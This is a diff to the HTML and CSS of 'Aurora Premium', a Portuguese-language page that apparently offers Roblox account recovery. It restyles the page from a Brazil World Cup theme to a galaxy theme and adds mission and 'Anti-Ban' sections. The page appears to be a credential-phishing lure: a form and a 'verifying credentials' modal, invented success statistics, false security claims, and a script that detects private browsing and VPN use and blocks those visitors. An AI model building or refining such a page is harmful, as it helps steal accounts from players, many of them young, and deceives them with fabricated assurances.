+        /* ===== NOVA SEÇÃO: GALAXY (GALÁXIA) ===== */
+        .galaxy-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .galaxy-card {
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 16px;
+            padding: 2rem;
+            text-align: center;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .galaxy-card:nth-child(1) { animation-delay: 0.1s; }
+        .galaxy-card:nth-child(2) { animation-delay: 0.2s; }
+        .galaxy-card:nth-child(3) { animation-delay: 0.3s; }
+
+        .galaxy-card:hover {
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
+            transform: translateY(-8px) scale(1.02);
+            box-shadow: 0 20px 40px rgba(124, 58, 237, 0.3);
+        }
+
+        .galaxy-icon {
+            font-size: 3rem;
+            margin-bottom: 1rem;
+            display: block;
+            color: #c084fc;
+        }
+
+        .galaxy-card h3 {
+            color: white;
+            font-size: 1.2rem;
+            font-weight: 800;
+            margin-bottom: 0.5rem;
+        }
+
+        .galaxy-card p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.9rem;
+            line-height: 1.6;
+        }
+
+        .galaxy-card .galaxy-tag {
+            display: inline-block;
+            margin-top: 1rem;
+            padding: 0.3rem 1rem;
+            background: rgba(124, 58, 237, 0.2);
+            border: 1px solid rgba(192, 132, 252, 0.3);
+            border-radius: 50px;
+            color: #c084fc;
+            font-size: 0.75rem;
+            font-weight: 700;
+        }
+
+        /* ===== NOVA SEÇÃO: MISSION (MISSÕES) ===== */
+        .mission-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(280px, 1fr));
+            gap: 1.5rem;
+            margin-top: 2rem;
+        }
+
+        .mission-card {
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.12), rgba(124, 58, 237, 0.03));
+            backdrop-filter: blur(20px);
+            -webkit-backdrop-filter: blur(20px);
+            border: 1px solid rgba(124, 58, 237, 0.2);
+            border-radius: 16px;
+            padding: 1.8rem;
+            transition: all 0.4s cubic-bezier(0.34, 1.56, 0.64, 1);
+            animation: fadeInUp 0.6s ease-out forwards;
+            opacity: 0;
+            position: relative;
+        }
+
+        .mission-card:nth-child(1) { animation-delay: 0.1s; }
+        .mission-card:nth-child(2) { animation-delay: 0.2s; }
+        .mission-card:nth-child(3) { animation-delay: 0.3s; }
+        .mission-card:nth-child(4) { animation-delay: 0.4s; }
+
+        .mission-card:hover {
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.06));
+            border-color: rgba(192, 132, 252, 0.4);
+            transform: translateY(-5px);
+        }
+
+        .mission-header {
+            display: flex;
+            align-items: center;
+            gap: 0.8rem;
+            margin-bottom: 0.8rem;
+        }
+
+        .mission-header i {
+            font-size: 1.5rem;
+            color: #c084fc;
+        }
+
+        .mission-header h3 {
+            color: white;
+            font-size: 1rem;
+            font-weight: 700;
+        }
+
+        .mission-card p {
+            color: rgba(255, 255, 255, 0.6);
+            font-size: 0.85rem;
+            line-height: 1.6;
+        }
+
+        .mission-progress {
+            margin-top: 1rem;
+            background: rgba(255, 255, 255, 0.05);
+            border-radius: 10px;
+            height: 8px;
+            overflow: hidden;
+        }
+
+        .mission-progress .progress-bar {
+            height: 100%;
+            background: linear-gradient(90deg, #7c3aed, #c084fc);
+            border-radius: 10px;
+            transition: width 1s ease;
+        }
+
+        .mission-card .mission-status {
+            display: inline-block;
+            margin-top: 0.8rem;
+            padding: 0.2rem 0.8rem;
+            border-radius: 50px;
+            font-size: 0.7rem;
+            font-weight: 700;
+        }
+
+        .mission-status.active {
+            background: rgba(16, 185, 129, 0.2);
+            color: #10b981;
+            border: 1px solid rgba(16, 185, 129, 0.3);
+        }
+
+        .mission-status.pending {
+            background: rgba(245, 158, 11, 0.2);
+            color: #f59e0b;
+            border: 1px solid rgba(245, 158, 11, 0.3);
+        }
+
+        .mission-status.completed {
+            background: rgba(124, 58, 237, 0.2);
+            color: #c084fc;
+            border: 1px solid rgba(192, 132, 252, 0.3);
+        }
+
         /* ===== FOOTER ===== */
         .footer {
-            background: rgba(10, 26, 10, 0.95);
-            border-top: 2px solid rgba(254, 220, 0, 0.1);
+            background: rgba(10, 6, 21, 0.95);
+            border-top: 2px solid rgba(124, 58, 237, 0.2);
             padding: 3rem 0 1.5rem;
             margin-top: 4rem;
             position: relative;
@@ -1453,7 +1652,7 @@
         }
 
         .footer-section a:hover {
-            color: #fedc00;
+            color: #c084fc;
             padding-left: 0.3rem;
         }
 
@@ -1464,18 +1663,18 @@
         .footer-bottom {
             text-align: center;
             padding-top: 1.5rem;
-            border-top: 1px solid rgba(254, 220, 0, 0.1);
+            border-top: 1px solid rgba(124, 58, 237, 0.2);
             color: rgba(255, 255, 255, 0.5);
             font-size: 0.8rem;
         }
 
         .footer-bottom i {
-            color: #009739;
+            color: #7c3aed;
             animation: pulse 1.5s ease-in-out infinite;
         }
 
-        .footer-bottom .gold {
-            color: #fedc00;
+        .footer-bottom .purple {
+            color: #c084fc;
         }
 
         /* ===== MODAL ===== */
@@ -1500,10 +1699,10 @@
 
         .processing-modal,
         .success-modal {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.95), rgba(26, 42, 26, 0.95));
+            background: linear-gradient(135deg, rgba(10, 6, 21, 0.95), rgba(26, 10, 46, 0.95));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
-            border: 1px solid rgba(254, 220, 0, 0.15);
+            border: 1px solid rgba(124, 58, 237, 0.3);
             border-radius: 20px;
             padding: 2.5rem;
             max-width: 450px;
@@ -1515,8 +1714,8 @@
         .loader {
             width: 70px;
             height: 70px;
-            border: 4px solid rgba(0, 151, 57, 0.2);
-            border-top: 4px solid #fedc00;
+            border: 4px solid rgba(124, 58, 237, 0.2);
+            border-top: 4px solid #c084fc;
             border-radius: 50%;
             margin: 0 auto 1.5rem;
             animation: spin 1s linear infinite;
@@ -1551,7 +1750,7 @@
 
         .progress-fill {
             height: 100%;
-            background: linear-gradient(90deg, #009739, #fedc00);
+            background: linear-gradient(90deg, #7c3aed, #c084fc);
             border-radius: 10px;
             animation: progressFill 3s ease-out forwards;
         }
@@ -1565,15 +1764,15 @@
         .success-icon {
             width: 80px;
             height: 80px;
-            background: linear-gradient(135deg, rgba(0, 151, 57, 0.2), rgba(0, 151, 57, 0.05));
-            border: 2px solid rgba(0, 151, 57, 0.4);
+            background: linear-gradient(135deg, rgba(124, 58, 237, 0.2), rgba(124, 58, 237, 0.05));
+            border: 2px solid rgba(124, 58, 237, 0.4);
             border-radius: 50%;
             display: flex;
             align-items: center;
             justify-content: center;
             margin: 0 auto 1.5rem;
             font-size: 2.5rem;
-            color: #00b84a;
+            color: #a78bfa;
             animation: bounceIn 0.6s ease-out;
         }
 
@@ -1593,15 +1792,15 @@
         }
 
         .btn-success {
-            background: linear-gradient(135deg, #009739, #00802e);
+            background: linear-gradient(135deg, #7c3aed, #6d28d9);
             color: white;
-            box-shadow: 0 10px 30px rgba(0, 151, 57, 0.3);
+            box-shadow: 0 10px 30px rgba(124, 58, 237, 0.3);
             width: 100%;
         }
 
         .btn-success:hover {
             transform: translateY(-3px);
-            box-shadow: 0 15px 40px rgba(0, 151, 57, 0.5);
+            box-shadow: 0 15px 40px rgba(124, 58, 237, 0.5);
         }
 
         /* ===== BLOQUEIO DE ACESSO ===== */
@@ -1624,7 +1823,7 @@
         }
 
         .block-modal-content {
-            background: linear-gradient(135deg, rgba(10, 26, 10, 0.98), rgba(26, 42, 26, 0.98));
+            background: linear-gradient(135deg, rgba(10, 6, 21, 0.98), rgba(26, 10, 46, 0.98));
             backdrop-filter: blur(20px);
             -webkit-backdrop-filter: blur(20px);
             border: 2px solid rgba(239, 68, 68, 0.4);
@@ -1695,6 +1894,8 @@
             .recovery-grid { grid-template-columns: 1fr; }
             .main-card { padding: 1.5rem; }
             .container { padding: 0 1.2rem; }
+            .nav-menu { gap: 0.2rem; }
+            .nav-link { font-size: 0.7rem; padding: 0.3rem 0.5rem; }
         }
 
         @media (max-width: 768px) {
@@ -1705,13 +1906,13 @@
                 top: 100%;
                 left: 0;
                 right: 0;
-                background: rgba(10, 26, 10, 0.98);
+                background: rgba(10, 6, 21, 0.98);
                 backdrop-filter: blur(20px);
                 -webkit-backdrop-filter: blur(20px);
                 padding: 1rem 1.5rem;
                 gap: 0.3rem;
-                border-bottom: 2px solid rgba(254, 220, 0, 0.1);
-                box-shadow: 0 20px 40px rgba(0,0,0,0.3);
+                border-bottom: 2px solid rgba(124, 58, 237, 0.2);
+                box-shadow: 0 20px 40px rgba(0,0,0,0.5);
             }
 
             .nav-menu.open { display: flex; }
@@ -1734,7 +1935,9 @@
             .faq-grid,
             .stats-grid,
             .donation-grid,
-            .comunidade-grid {
+            .comunidade-grid,
+            .galaxy-grid,
+            .mission-grid {
                 grid-template-columns: 1fr;
                 gap: 1rem;
             }
@@ -1789,12 +1992,13 @@
     </style>
 </head>
 <body>
-    <!-- ===== FUNDO ANIMADO ===== -->
-    <div class="animated-bg">
-        <div class="stars"></div>
+    <!-- ===== FUNDO ANIMADO DE ESTRELAS ===== -->
+    <div class="animated-bg" id="animatedBg">
+        <div class="stars-container" id="starsContainer"></div>
         <div class="glow-orb glow-1"></div>
         <div class="glow-orb glow-2"></div>
         <div class="glow-orb glow-3"></div>
+        <div class="glow-orb glow-4"></div>
     </div>
 
     <!-- ===== TERMS & PRIVACY MODAL ===== -->
@@ -1803,7 +2007,7 @@
             <button class="terms-close-btn" onclick="closeTermsModal()">
                 <i class="fas fa-times"></i>
             </button>
-            <h2>🇧🇷 Termos de Serviço & Política de Privacidade</h2>
+            <h2>✦ Termos de Serviço & Política de Privacidade</h2>
             
             <h3>1. Termos de Serviço</h3>
             <p>Ao utilizar a plataforma Aurora Premium, você concorda com os seguintes termos:</p>
@@ -1839,7 +2043,7 @@
         </div>
     </div>
 
-    <!-- ===== BLOQUEIO DE ANÔNIMO ===== -->
+    <!-- ===== BLOQUEIO DE ACESSO ===== -->
     <div class="block-modal-overlay" id="blockModal">
         <div class="block-modal-content">
             <div class="block-icon">🚫</div>
@@ -1867,6 +2071,8 @@
             <div class="nav-menu" id="navMenu">
                 <a class="nav-link active" onclick="showSection('home')"><i class="fas fa-home"></i> Home</a>
                 <a class="nav-link" onclick="showSection('recovery')"><i class="fas fa-sync-alt"></i> Recuperar</a>
+                <a class="nav-link" onclick="showSection('galaxy')"><i class="fas fa-galaxy"></i> Galáxia</a>
+                <a class="nav-link" onclick="showSection('missions')"><i class="fas fa-tasks"></i> Missões</a>
                 <a class="nav-link" onclick="showSection('comunidade')"><i class="fas fa-users"></i> Comunidade</a>
                 <a class="nav-link" onclick="showSection('faq')"><i class="fas fa-question-circle"></i> FAQ</a>
                 <a class="nav-link" onclick="showSection('stats')"><i class="fas fa-chart-bar"></i> Stats</a>
@@ -1883,20 +2089,20 @@
         <div class="container">
             <div class="hero-content">
                 <div class="hero-badge">
-                    <i class="fas fa-crown"></i>
-                    🏆 HexaVem! 🇧🇷
+                    <i class="fas fa-star"></i>
+                    ✦ Universo Aurora ✦
                 </div>
                 <h1 class="hero-title">Aurora Premium</h1>
-                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="hexa">🏆 HEXAVEM!</span></p>
+                <p class="hero-subtitle">Sistema Avançado de Recuperação • <span class="star-icon">✦ ESTELAR ✦</span></p>
                 <p class="hero-description">
                     Recupere sua conta Roblox de forma segura, rápida e confiável com nossa plataforma de última geração. 
-                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#fedc00;">#HexaVem</strong>
+                    Tecnologia de ponta, criptografia militar e suporte 24/7 dedicado. <strong style="color:#c084fc;">✦ Aurora ✦</strong>
                 </p>
                 <div class="hero-features">
                     <div class="feature-badge"><i class="fas fa-shield-alt"></i> 100% Seguro</div>
                     <div class="feature-badge"><i class="fas fa-bolt"></i> Ultrarrápido</div>
                     <div class="feature-badge"><i class="fas fa-check-circle"></i> Verificado</div>
-                    <div class="feature-badge"><i class="fas fa-trophy"></i> #HexaVem</div>
+                    <div class="feature-badge"><i class="fas fa-star"></i> Premium</div>
                 </div>
                 <div class="hero-cta">
                     <button class="btn btn-primary btn-lg" onclick="goToRecovery()">
@@ -1909,8 +2115,8 @@
         <!-- CARDS SECTION -->
         <div class="cards-section">
             <div class="container">
-                <h2 class="section-title">Por que Escolher Aurora? 🇧🇷</h2>
-                <p class="section-subtitle">Recursos que fazem a diferença</p>
+                <h2 class="section-title">✦ Por que Escolher Aurora? ✦</h2>
+                <p class="section-subtitle">Recursos que fazem a diferença no universo digital</p>
                 <div class="cards-grid">
                     <div class="card">
                         <div class="card-icon"><i class="fas fa-rocket"></i></div>
@@ -1928,9 +2134,19 @@
                         <p class="card-text">Equipe sempre pronta para ajudar você. Respostas em menos de 1 hora.</p>
                     </div>
                     <div class="card">
-                        <div class="card-icon"><i class="fas fa-trophy"></i></div>
-                        <h3 class="card-title">HexaVem!</h3>
-                        <p class="card-text">Junte-se à torcida do hexa! A energia da seleção brasileira está conosco.</p>
+                        <div class="card-icon"><i class="fas fa-star"></i></div>
+                        <h3 class="card-title">Estelar</h3>
+                        <p class="card-text">Junte-se à constelação Aurora! A energia das estrelas está conosco.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-shield-halved"></i></div>
+                        <h3 class="card-title">Anti-Ban</h3>
+                        <p class="card-text">Sistema de proteção contra bloqueios e detecções. Segurança total.</p>
+                    </div>
+                    <div class="card">
+                        <div class="card-icon"><i class="fas fa-crown"></i></div>
+                        <h3 class="card-title">Premium</h3>
+                        <p class="card-text">Recursos exclusivos para membros premium. Recuperação prioritária.</p>
                     </div>
                 </div>
             </div>
@@ -1941,14 +2157,14 @@
     <section class="section" id="recovery">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Dashboard de Recuperação</h2>
-                <p class="section-subtitle">Recupere sua conta de forma segura e confiável 🇧🇷</p>
+                <h2 class="section-title">✦ Dashboard de Recuperação ✦</h2>
+                <p class="section-subtitle">Recupere sua conta de forma segura e confiável</p>
                 
                 <div class="recovery-grid">
                     <div class="main-card">
                         <div class="card-header">
                             <h1>Recuperar Sua Conta</h1>
-                            <span class="badge">🏆 HexaVem</span>
+                            <span class="badge">✦ Premium ✦</span>
                         </div>
 
                         <form id="recoveryForm" onsubmit="handleSubmit(event)">
@@ -1977,7 +2193,7 @@
 
                             <div class="security-box">
                                 <i class="fas fa-shield-alt"></i>
-                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#fedc00;">🇧🇷 #HexaVem</span></p>
+                                <p><strong>Segurança:</strong> Seus dados são criptografados com AES-256 e processados em servidores seguros com proteção de nível militar. <span style="color:#c084fc;">✦ Aurora Shield ✦</span></p>
                             </div>
 
                             <button type="submit" class="btn btn-primary btn-block btn-lg" id="submitBtn">
@@ -1993,7 +2209,7 @@
                                 <div style="margin-top: 1rem; display: flex; flex-direction: column; gap: 0.5rem; align-items: center;">
                                     <p style="color: rgba(255,255,255,0.6); font-size: 0.8rem;">Precisa de ajuda? Entre em contato:</p>
                                     <div style="display: flex; gap: 1rem; flex-wrap: wrap; justify-content: center;">
-                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #fedc00; text-decoration: none; font-size: 0.85rem; background: rgba(0,151,57,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(0,151,57,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
+                                        <a href="https://discord.gg/ztskdZZjEs" target="_blank" style="color: #c084fc; text-decoration: none; font-size: 0.85rem; background: rgba(124,58,237,0.15); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(124,58,237,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
                                             <i class="fab fa-discord"></i> Discord
                                         </a>
                                         <a href="https://www.tiktok.com/@244brobt" target="_blank" style="color: #25f4ee; text-decoration: none; font-size: 0.85rem; background: rgba(0,0,0,0.3); padding: 0.3rem 0.8rem; border-radius: 8px; border: 1px solid rgba(37,244,238,0.3); display: inline-flex; align-items: center; gap: 0.3rem;">
@@ -2013,11 +2229,11 @@
                         <div class="info-card">
                             <h4><i class="fas fa-server"></i> Status do Sistema</h4>
                             <div style="margin-bottom: 0.8rem;">
-                                <span class="status-indicator"><i class="fas fa-circle"></i> Online 🇧🇷</span>
+                                <span class="status-indicator"><i class="fas fa-circle"></i> Online ✦</span>
                             </div>
-                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #00b84a; font-weight: 700;">✓ Operacional</span></div>
-                            <div class="info-item"><span class="info-label">API</span><span style="color: #00b84a; font-weight: 700;">✓ Funcionando</span></div>
-                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #00b84a; font-weight: 700;">✓ Protegido</span></div>
+                            <div class="info-item"><span class="info-label">Servidores</span><span style="color: #a78bfa; font-weight: 700;">✓ Operacional</span></div>
+                            <div class="info-item"><span class="info-label">API</span><span style="color: #a78bfa; font-weight: 700;">✓ Funcionando</span></div>
+                            <div class="info-item"><span class="info-label">Segurança</span><span style="color: #a78bfa; font-weight: 700;">✓ Protegido</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2025,7 +2241,7 @@
                             <div class="info-item"><span class="info-label">Contas Recuperadas</span><span class="info-value">15,847</span></div>
                             <div class="info-item"><span class="info-label">Taxa de Sucesso</span><span class="info-value">99.8%</span></div>
                             <div class="info-item"><span class="info-label">Tempo Médio</span><span class="info-value">2h 30m</span></div>
-                            <div class="info-item"><span class="info-label">Torcida</span><span class="info-value">🏆 HexaVem!</span></div>
+                            <div class="info-item"><span class="info-label">Estrelas</span><span class="info-value">✦✦✦✦✦</span></div>
                         </div>
 
                         <div class="info-card">
@@ -2036,8 +2252,97 @@
                                 <li><i class="fas fa-check"></i> Verificação 2FA</li>
                                 <li><i class="fas fa-check"></i> Histórico Completo</li>
                                 <li><i class="fas fa-check"></i> Backup Automático</li>
+                                <li><i class="fas fa-check"></i> Anti-Ban Shield</li>
                             </ul>
                         </div>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== NOVA SEÇÃO: GALAXY ===== -->
+    <section class="section" id="galaxy">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">✦ Galáxia Aurora ✦</h2>
+                <p class="section-subtitle">Explore o universo de possibilidades</p>
+                
+                <div class="galaxy-grid">
+                    <div class="galaxy-card">
+                        <span class="galaxy-icon">🌌</span>
+                        <h3>Constelação de Segurança</h3>
+                        <p>Nossa rede de proteção cobre todo o sistema com criptografia de ponta a ponta, formando uma constelação impenetrável.</p>
+                        <span class="galaxy-tag">✦ Ativo ✦</span>
+                    </div>
+                    <div class="galaxy-card">
+                        <span class="galaxy-icon">⭐</span>
+                        <h3>Estrelas de Sucesso</h3>
+                        <p>Milhares de usuários já recuperaram suas contas com nossa tecnologia. Cada estrela representa uma história de sucesso.</p>
+                        <span class="galaxy-tag">✦ 15,847 ✦</span>
+                    </div>
+                    <div class="galaxy-card">
+                        <span class="galaxy-icon">🚀</span>
+                        <h3>Nave Mãe Aurora</h3>
+                        <p>Nossa infraestrutura escalável suporta milhares de requisições simultâneas com velocidade e precisão estelar.</p>
+                        <span class="galaxy-tag">✦ Ultra Rápido ✦</span>
+                    </div>
+                </div>
+            </div>
+        </div>
+    </section>
+
+    <!-- ===== NOVA SEÇÃO: MISSIONS ===== -->
+    <section class="section" id="missions">
+        <div class="container">
+            <div class="content-wrapper">
+                <h2 class="section-title">✦ Missões Espaciais ✦</h2>
+                <p class="section-subtitle">Complete missões e ganhe recompensas exclusivas</p>
+                
+                <div class="mission-grid">
+                    <div class="mission-card">
+                        <div class="mission-header">
+                            <i class="fas fa-rocket"></i>
+                            <h3>Primeira Recuperação</h3>
+                        </div>
+                        <p>Complete sua primeira recuperação de conta com sucesso.</p>
+                        <div class="mission-progress">
+                            <div class="progress-bar" style="width: 0%;"></div>
+                        </div>
+                        <span class="mission-status pending">⏳ Pendente</span>
+                    </div>
+                    <div class="mission-card">
+                        <div class="mission-header">
+                            <i class="fas fa-shield-alt"></i>
+                            <h3>Escudo Estelar</h3>
+                        </div>
+                        <p>Ative a proteção anti-ban e mantenha sua conta segura.</p>
+                        <div class="mission-progress">
+                            <div class="progress-bar" style="width: 100%;"></div>
+                        </div>
+                        <span class="mission-status completed">✅ Concluída</span>
+                    </div>
+                    <div class="mission-card">
+                        <div class="mission-header">
+                            <i class="fas fa-users"></i>
+                            <h3>Comunidade Ativa</h3>
+                        </div>
+                        <p>Entre no servidor do Discord e participe da comunidade.</p>
+                        <div class="mission-progress">
+                            <div class="progress-bar" style="width: 50%;"></div>
+                        </div>
+                        <span class="mission-status active">🔄 Em andamento</span>
+                    </div>
+                    <div class="mission-card">
+                        <div class="mission-header">
+                            <i class="fas fa-star"></i>
+                            <h3>Recuperação Premium</h3>
+                        </div>
+                        <p>Realize 5 recuperações e desbloqueie o status Premium.</p>
+                        <div class="mission-progress">
+                            <div class="progress-bar" style="width: 20%;"></div>
+                        </div>
+                        <span class="mission-status active">🔄 Em andamento</span>
                     </div>
                 </div>
             </div>
@@ -2048,8 +2353,8 @@
     <section class="section" id="comunidade">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">👥 Nossa Comunidade 🇧🇷</h2>
-                <p class="section-subtitle">Conecte-se conosco e faça parte da família Aurora</p>
+                <h2 class="section-title">✦ Nossa Comunidade ✦</h2>
+                <p class="section-subtitle">Conecte-se conosco e faça parte da constelação Aurora</p>
                 
                 <div class="comunidade-grid">
                     <div class="comunidade-card" onclick="window.open('https://discord.gg/ztskdZZjEs', '_blank')">
@@ -2077,6 +2382,13 @@
                         <p>Acompanhe nossos vídeos de suporte, dicas e tutoriais no TikTok.</p>
                         <button class="btn-comunidade"><i class="fab fa-tiktok"></i> Seguir no TikTok</button>
                     </div>
+
+                    <div class="comunidade-card" onclick="window.open('https://github.com', '_blank')">
+                        <div class="comunidade-icon github"><i class="fab fa-github"></i></div>
+                        <h3>GitHub</h3>
+                        <p>Confira nosso código aberto e contribua com o projeto Aurora.</p>
+                        <button class="btn-comunidade"><i class="fab fa-github"></i> Ver no GitHub</button>
+                    </div>
                 </div>
             </div>
         </div>
@@ -2086,8 +2398,8 @@
     <section class="section" id="faq">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Perguntas Frequentes</h2>
-                <p class="section-subtitle">Encontre respostas para suas dúvidas 🇧🇷</p>
+                <h2 class="section-title">✦ Perguntas Frequentes ✦</h2>
+                <p class="section-subtitle">Encontre respostas para suas dúvidas</p>
                 
                 <div class="faq-grid">
                     <div class="faq-item">
@@ -2146,7 +2458,7 @@
                             <i class="fas fa-chevron-down"></i>
                         </div>
                         <div class="faq-answer">
-                            <p>Você pode nos contatar através do Discord, TikTok ou pelo email support@aurora.com. Respondemos em até 24 horas com soluções rápidas e eficientes.</p>
+                            <p>Você pode nos contatar através do Discord, TikTok ou pelo email suporte.auroraplum@gmail.com. Respondemos em até 24 horas com soluções rápidas e eficientes.</p>
                         </div>
                     </div>
                 </div>
@@ -2158,7 +2470,7 @@
     <section class="section" id="stats">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Nossos Números 🇧🇷</h2>
+                <h2 class="section-title">✦ Nossos Números ✦</h2>
                 <p class="section-subtitle">Confiança de milhares de usuários ao redor do mundo</p>
                 
                 <div class="stats-grid">
@@ -2183,7 +2495,7 @@
     <section class="section" id="donate">
         <div class="container">
             <div class="content-wrapper">
-                <h2 class="section-title">Apoie o Projeto 🇧🇷</h2>
+                <h2 class="section-title">✦ Apoie o Projeto ✦</h2>
                 <p class="section-subtitle">Sua doação ajuda a manter e melhorar o Aurora</p>
                 
                 <div class="donation-grid">
@@ -2216,10 +2528,10 @@
                     </div>
                 </div>
 
-                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(0,151,57,0.1), rgba(254,220,0,0.1)); border-radius: 16px; border: 1px solid rgba(254,220,0,0.2);">
-                    <i class="fas fa-trophy" style="font-size: 1.8rem; color: #fedc00; display: block; margin-bottom: 0.5rem;"></i>
-                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">🏆 HexaVem! Sistema em Manutenção</h3>
-                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve 🇧🇷</p>
+                <div style="text-align: center; margin-top: 2rem; padding: 1.5rem; background: linear-gradient(135deg, rgba(124,58,237,0.1), rgba(192,132,252,0.1)); border-radius: 16px; border: 1px solid rgba(124,58,237,0.3);">
+                    <i class="fas fa-star" style="font-size: 1.8rem; color: #c084fc; display: block; margin-bottom: 0.5rem;"></i>
+                    <h3 style="color: white; font-weight: 800; margin-bottom: 0.5rem; font-size: 1.1rem;">✦ Sistema em Manutenção ✦</h3>
+                    <p style="color: rgba(255,255,255,0.6); font-size: 0.9rem;">Estamos preparando novidades incríveis para você! Volte em breve</p>
                 </div>
             </div>
         </div>
@@ -2229,14 +2541,16 @@
     <footer class="footer">
         <div class="footer-content">
             <div class="footer-section">
-                <h4>🇧🇷 Aurora Premium</h4>
-                <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7. <span style="color:#fedc00;">#HexaVem</span></p>
+                <h4>✦ Aurora Premium</h4>
+                <p>Plataforma profissional de recuperação de contas Roblox com segurança de nível militar e suporte 24/7. <span style="color:#c084fc;">✦ Premium ✦</span></p>
             </div>
             <div class="footer-section">
                 <h4>Links Rápidos</h4>
                 <ul>
                     <li><a href="#" onclick="showSection('home')">Home</a></li>
                     <li><a href="#" onclick="showSection('recovery')">Recuperação</a></li>
+                    <li><a href="#" onclick="showSection('galaxy')">Galáxia</a></li>
+                    <li><a href="#" onclick="showSection('missions')">Missões</a></li>
                     <li><a href="#" onclick="showSection('comunidade')">Comunidade</a></li>
                     <li><a href="#" onclick="showSection('faq')">FAQ</a></li>
                 </ul>
@@ -2246,17 +2560,17 @@
                 <ul>
                     <li><a href="#" target="_blank">Discord</a></li>
                     <li><a href="#" target="_blank">TikTok</a></li>
-                    <li><a href="#" target="_blank">Twitter</a></li>
+                    <li><a href="#" target="_blank">GitHub</a></li>
                 </ul>
             </div>
             <div class="footer-section">
                 <h4>Contato</h4>
-                <p><i class="fas fa-envelope"></i> support@aurora.com</p>
-                <p>Status: <span style="color: #00b84a;">● Online 🇧🇷</span></p>
+                <p><i class="fas fa-envelope"></i> suporte.auroraplum@gmail.com</p>
+                <p>Status: <span style="color: #a78bfa;">✦ Online ✦</span></p>
             </div>
         </div>
         <div class="footer-bottom">
-            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você 🇧🇷 <span class="gold">#HexaVem</span></p>
+            <p>&copy; 2026 Aurora Premium. Todos os direitos reservados. | Desenvolvido com <i class="fas fa-heart"></i> para você ✦ <span class="purple">Aurora</span></p>
         </div>
     </footer>
 
@@ -2264,7 +2578,7 @@
     <div class="modal-overlay" id="processingModal">
         <div class="processing-modal">
             <div class="loader"></div>
-            <h2 class="processing-title" id="processingTitle">Processando... 🇧🇷</h2>
+            <h2 class="processing-title" id="processingTitle">Processando... ✦</h2>
             <p class="processing-message" id="processingMessage">Verificando credenciais...</p>
             <div class="progress-container">
                 <div class="progress-bar"><div class="progress-fill"></div></div>
@@ -2276,9 +2590,9 @@
     <!-- ===== SUCCESS MODAL ===== -->
     <div class="modal-overlay" id="successModal">
         <div class="success-modal">
-            <div class="success-icon"><i class="fas fa-check"></i></div>
-            <h2 class="success-title">Sucesso! 🏆</h2>
-            <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve. <strong style="color:#fedc00;">#HexaVem</strong></p>
+            <div class="success-icon"><i class="fas fa-star"></i></div>
+            <h2 class="success-title">Sucesso! ✦</h2>
+            <p class="success-message">Sua conta foi identificada com sucesso no sistema. O processo de recuperação iniciará em breve. <strong style="color:#c084fc;">✦ Aurora ✦</strong></p>
             <button class="btn btn-success" onclick="closeSuccessModal()">
                 <i class="fas fa-check-circle"></i> Entendi, Continuar
             </button>
@@ -2287,16 +2601,40 @@
 
     <script>
         // ============================================================
+        // GERADOR DE ESTRELAS
+        // ============================================================
+        function createStars() {
+            const container = document.getElementById('starsContainer');
+            const count = 200;
+            
+            for (let i = 0; i < count; i++) {
+                const star = document.createElement('div');
+                star.className = 'star';
+                const size = Math.random() * 3 + 1;
+                const duration = Math.random() * 4 + 2;
+                const delay = Math.random() * 5;
+                
+                star.style.cssText = `
+                    width: ${size}px;
+                    height: ${size}px;
+                    left: ${Math.random() * 100}%;
+                    top: ${Math.random() * 100}%;
+                    --duration: ${duration}s;
+                    animation-delay: ${delay}s;
+                `;
+                container.appendChild(star);
+            }
+        }
+
+        // ============================================================
         // 1. DETECÇÃO AVANÇADA DE NAVEGADOR ANÔNIMO E VPN
         // ============================================================
         
-        // Detectar modo privado/anônimo com múltiplos métodos
         function isPrivateBrowsing() {
             return new Promise((resolve) => {
                 let detectionMethods = 0;
                 let positiveResults = 0;
 
